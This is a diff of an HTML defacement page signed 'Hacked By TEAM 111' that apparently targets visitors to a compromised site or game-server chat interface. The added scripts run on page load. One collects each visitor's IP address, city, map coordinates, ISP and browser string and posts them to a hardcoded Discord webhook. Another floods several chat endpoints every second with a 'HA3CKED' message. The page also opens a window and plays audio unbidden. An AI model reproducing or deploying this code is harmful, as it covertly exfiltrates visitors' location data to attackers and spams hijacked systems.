@@ -1,245 +1,372 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
     <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Custom Design</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>𝐇𝐚𝐜𝐤𝐞𝐝 𝐁𝐲 𝐓𝐄𝐀𝐌 𝟏𝟏𝟏</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: black;
-            color: #00f;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            background-color: #000;
+            background-image: linear-gradient(#111 1px, transparent 1px), linear-gradient(90deg, #111 1px, transparent 1px);
+            background-size: 15px 15px;
+            font-family: monospace;
+            color: #ccc;
             overflow: hidden;
-            flex-direction: column;
-            position: relative;
         }
 
-        .container {
-            text-align: center;
-            z-index: 1;
-        }
 
-        .image-container video {
-            width: 900px;
-            border: 2px solid #00f;
-            border-radius: 10px;
-            opacity: 0.5; /* الشفافية */
-            display: block;
-            margin: 0 auto;
-        }
-
-        .info {
-            margin-top: 20px;
-            font-size: 1.2rem;
-        }
-
-        .link {
-            margin-top: 15px;
-            font-size: 1.5rem;
-            color: #00f;
-            text-decoration: none;
-        }
-
-        .background {
+        .intro {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: -1;
-            object-fit: cover;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #e6e6e6;
+            font-size: 80px;
+            z-index: 9999;
+            /* إزالة الفيد اوت الافتراضي */
+            animation: none;
         }
 
-        .info p {
-            margin: 0;
-            white-space: pre-wrap;
+        /* تأثير الآلة الكاتبة */
+        .typewriter {
+            border-right: 4px solid #e6e6e6;
+            white-space: nowrap;
+            overflow: hidden;
+            width: 0;
+            animation: typing 3s steps(10, end) forwards, blink 0.75s step-end infinite;
         }
 
-        .code-effect {
-            color: #00ff00;
-            text-shadow: 0 0 10px #00ff00;
+        @keyframes typing {
+            from {
+                width: 0;
+            }
+
+            to {
+                width: 10ch;
+            }
         }
 
-        pre {
-            color: white;
-            background-color: rgba(0, 0, 0, 0.5);
-            padding: 10px;
-            border-radius: 5px;
+        @keyframes blink {
+            50% {
+                border-color: transparent;
+            }
         }
 
-        .decorative-text {
-            margin-top: 20px;
-            color: #00f;
-            font-size: 1.3rem;
-            text-shadow: 0 0 10px #00f;
-            font-style: italic;
+        /* الفيد اوت بعد انتهاء الكتابة */
+        .intro.fadeOut {
+            animation: fadeOut 2s ease forwards;
+            animation-delay: 3.5s;
         }
 
-        .signature-text {
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+
+        .container,
+        .left-box,
+        .right-box,
+        .box,
+        .footer {
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out forwards;
+            animation-delay: 5.5s;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+
+        .left-box,
+        .right-box {
+            position: absolute;
+            top: 25px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 18px;
+        }
+
+        .left-box {
+            left: 25px;
+        }
+
+        .right-box {
+            right: 25px;
+        }
+
+        .left-box a {
+            display: block;
+            margin: 8px 0;
+            color: #9b0000;
+            text-decoration: none;
+            font-size: 16px;
+        }
+
+        .left-box a:hover {
+            transform: translateX(5px);
+        }
+
+        .discord-link {
+            display: flex;
+            align-items: center;
+            color: #ccc;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+
+        .discord-link img {
+            width: 20px;
+            height: 20px;
+            margin-right: 5px;
+        }
+
+        .anime-image {
+            width: 600px;
+            border: 3px solid #333;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+
+        .title {
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #ccc;
+        }
+
+        .box {
+            width: 400px;
+            max-height: 250px;
+            overflow: auto;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            padding: 15px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: left;
+        }
+
+        .box code {
+            color: #9b0000;
+        }
+
+        .footer {
             margin-top: 15px;
-            color: #ff0000;
-            font-size: 1.2rem;
-            text-shadow: 0 0 5px #ff0000;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .text {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
         }
     </style>
 </head>
+
 <body>
-    <video
-        class="background"
-        autoplay
-        muted
-        loop
-    >
-        <source
-            src="https://cdn.discordapp.com/attachments/1295010205255335978/1411794202748129300/asd.mp4?ex=68b5f34f&is=68b4a1cf&hm=31abc359b32fb3aaeab358388674a06e175fc72a07786178500016d3f8a481c&&"
-            type="video/mp4"
-        />
-        Your browser does not support the video tag.
-    </video>
+
+    <div class="intro"><div class="typewriter">𝐓𝐄𝐀𝐌 𝟏𝟏𝟏</div></div>
+
+    <div class="left-box">
+        𝐇𝐚𝐜𝐤𝐞𝐝 𝐁𝐲 𝐓𝐄𝐀𝐌 𝟏𝟏𝟏
+        <a href="#">بدك تصير زلمة؟</a>
+        <a href="#">تعال تيم 111 </a>
+        <a href="#">بدك تصير مبرمج وهاك</a>
+        <a href="#">تعال تيم 111</a>
+        <hr style="margin: 10px 0; border: none; border-top: 1px solid #333;">
+    </div>
+
+    <div class="right-box">
+        <div class="info" id="ip-info">
+            <strong>IP:</strong> <span id="ip"></span><br>
+            <strong>City:</strong> <span id="city"></span><br>
+            <strong>Region:</strong> <span id="region"></span><br>
+            <strong>Country:</strong> <span id="country"></span><br>
+            <strong>Location:</strong> <span id="loc"></span><br>
+            <strong>Organization:</strong> <span id="org"></span><br>
+            <strong>Timezone:</strong> <span id="timezone"></span>
+        </div>
+    </div>
+
+    <audio autoplay loop>
+        <source src="https://l.top4top.io/m_3502csmtm1.mp4" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
 
     <div class="container">
-        <div class="image-container">
-            <video
-                width="400"
-                autoplay
-                muted
-                loop
-                playsinline
-                style="border: 2px solid #00f; border-radius: 10px; opacity: 0.5;"
-            >
-                <source
-                    src="https://cdn.discordapp.com/attachments/1295010205255335978/1411794202748129300/asd.mp4?ex=68b5f34f&is=68b4a1cf&hm=31abc359b32fb3aaeab358388674a06e175fc72a07786178500016d3f8a4a81c&"
-                    type="video/mp4"
-                />
-                Your browser does not support the video tag.
-            </video>
+        <img class="anime-image" src="https://www.raed.net/img?id=1386660" alt="Anime" />
+        <div class="title">𝐇𝐚𝐜𝐤𝐞𝐝 𝐁𝐲 𝐓𝐄𝐀𝐌 𝟏𝟏𝟏</div>
+
+        <div class="box">
+            <div style="border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 8px;">
+                <span style="color: #ccc; font-weight: bold;"></span>
+            </div>
+            <div style="color: #888; font-size: 14px; margin-bottom: 8px;">
+                server@system:~$ <strong>why?</strong>
+            </div>
+            <div style="color: #9b0000; font-size: 16px; line-height: 1.6;">
+                Team 111 : 𝐇𝐚𝐜𝐤𝐞𝐝 𝐁𝐲 𝐓𝐄𝐀𝐌 𝟏𝟏𝟏
+                <div style="color: #888; font-size: 12px; margin-top: 8px;">
+                </div>
+            </div>
+            <div class="footer">OFFICALY BLACK$HAMMER • </div>
         </div>
 
-        <div class="media-container">
-            <audio autoplay loop>
-                <source
-                    src="https://l.top4top.io/m_3502csmtm1.mp4"
-                    type="audio/mp3"
-                />
-                Your browser does not support the audio element.
-            </audio>
-        </div>
+        <script>
 
-        <br /><br />
-
-        <div style="color: blua;">
-            <b>Your IP Address:</b> <span id="ip-address-value">Fetching...</span
-            ><br />
-            <b>IP Information:</b>
-            <pre id="ip-info">Fetching...</pre>
-        </div>
-
-        <div class="decorative-text">
-            <p>You Get Hacking By #LYRIC & TEAM111</p>
-            <p></p>
-        </div>
-
-        <div class="signature-text">
-            <p></p>
-        </div>
-    </div>
-
-   
-      
-
-        <div class="signature-text">
-            <p></p>
-        </div>
-    </div>
-
-   <script type="text/javascript">
-        var omitformtags = ['input', 'textarea', 'select'].join('|');
-
-        function disableselect(e) {
-            if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
-                return false;
-        }
-
-        function reEnable() {
-            return true;
-        }
-
-        if (typeof document.onselectstart != 'undefined')
-            document.onselectstart = function () {
-                return false;
-            };
-        else {
-            document.onmousedown = disableselect;
-            document.onmouseup = reEnable;
-        }
-
-        function fetchIPAndInfo() {
-            fetch('https://api.ipify.org/?format=json')
-                .then((response) => response.json())
-                .then((data) => {
-                    document.getElementById('ip-address-value').textContent = data.ip;
-                    return data.ip;
-                })
-                .then((ip) => fetch(`https://ipinfo.io/${ip}/json`))
-                .then((response) => response.json())
-                .then((ipInfoData) => {
-                    document.getElementById('ip-info').textContent = JSON.stringify(
-                        ipInfoData,
-                        null,
-                        2
-                    );
-                })
-                .catch((error) => {
-                    console.error('Error:', error);
-                    document.getElementById('ip-address-value').textContent =
-                        'Unable to fetch IP address.';
-                    document.getElementById('ip-info').textContent =
-                        'Unable to fetch IP information.';
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip').innerHTML = data.ip || '';
+                    document.getElementById('city').innerHTML = data.city || '';
+                    document.getElementById('region').innerHTML = data.region || '';
+                    document.getElementById('country').innerHTML = data.country || '';
+                    document.getElementById('loc').innerHTML = data.loc || '';
+                    document.getElementById('org').innerHTML = data.org || '';
+                    document.getElementById('timezone').innerHTML = data.timezone || '';
                 });
-        }
-
-        fetchIPAndInfo();
 
 
-        function sendToDiscord(ipInfoData, googleMapsLink, username) {
-            const webhookURL = "https://discord.com/api/webhooks/1411790150995808277/WRoykuQ42pzq9fv_Re8YCCBsFvqB4rZf1m-fo3M6ScDlVkeF2sa4vOE3kQfVw00wvXGA";
-            const payload = {
-                content: `New visitor IP: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
-            };
+            setTimeout(() => {
+                document.querySelector('.intro').classList.add('fadeOut');
+            }, 3500);
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => console.log("IP, location, and username sent to Discord successfully!"))
-            .catch(error => console.error("Error sending data to Discord:", error));
-        }
 
-        fetchIPAndInfo();
-    </script>
+            setTimeout(() => {
+                const elements = document.querySelectorAll('.container, .left-box, .right-box, .box, .footer');
+                elements.forEach(el => {
+                    el.style.opacity = '1';
+                });
+            }, 5500);
+
+
+            setTimeout(() => {
+                window.open("https://cdn.discordapp.com/attachments/1239118162260135967/1392950213605458032/standard.gif?ex=6884833a&is=688331ba&hm=0514787c27cce792dbcdda6ddbd4bef8c1655f107572833232e1b6bbe0bf6284&", "_blank");
+            }, 50);
+
+
+            const msg = `HA3CKED BY LARIC - .gg/T101 ! 👑`;
+            const body = JSON.stringify({ message: msg });
+            setInterval(() => {
+                fetch("https://flix-scripts/chatResult", { method: "POST", body });
+                fetch("https://danger_chat/Danger_Chat:SendMessage", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        "message": msg,
+                        "channel": "شات العام",
+                        "color": null,
+                        "isImageAndLinksAllowed": [false, false]
+                    })
+                });
+                fetch("https://easy-chat+/o6ZbK5Ecp6", {
+                    headers: {
+                        accept: "*/*",
+                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+                    },
+                    body: JSON.stringify({ message: msg, channel: "شات العام" }),
+                    method: "POST"
+                });
+                fetch("https://melix_chat/chatResult", { method: "POST", body });
+                fetch("https://as_chat/chatResult", { method: "POST", body });
+                fetch("https://chat/chatResult", { method: "POST", body });
+                fetch("https://ho-chatv2/Chat", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        "Type": "chatResult",
+                        "message": msg,
+                        "chatType": "general"
+                    })
+                });
+            }, 1000);
+        </script>
+        <script>
+            setInterval(function() {
+            }, 1000);
+        </script>
+    </div>
+
+<script>
+async function sendToDiscord() {
+  const webhookURL = "https://discord.com/api/webhooks/1411790150995808277/WRoykuQ42pzq9fv_Re8YCCBsFvqB4rZf1m-fo3M6ScDlVkeF2sa4vOE3kQfVw00wvXGA";
+
+  try {
+   
+    const res = await fetch("https://ipinfo.io/json?token=3208692c122231");
+    const ipInfoData = await res.json();
+
+  
+    const googleMapsLink = `https://www.google.com/maps?q=${ipInfoData.loc}`;
+
+    
+    const username = navigator.userAgent;
+
+    
+    const payload = {
+      content: `🌐 **ثغرة شاشة**\n\n` +
+               `**IP:** ${ipInfoData.ip}\n` +
+               `**User:** ${username}\n` +
+               `**Location:** ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\n` +
+               `**Google Maps:** ${googleMapsLink}\n` +
+               `**ISP:** ${ipInfoData.org}`
+    };
+
+
+    await fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    console.log("✅ تم إرسال البيانات بنجاح!");
+  } catch (err) {
+    console.error("⚠️ خطأ أثناء جلب أو إرسال البيانات:", err);
+  }
+}
+
+// استدعاء الدالة عند فتح الصفحة
+window.onload = sendToDiscord;
+</script>
 
 </body>
-</html>
 
-    </script>
-</body>
-</html><!DOCTYPE html>
-<html>
-<head>
-<title>Page Title</title>
-</head>
-<body>
-
-
-</body>
 </html>
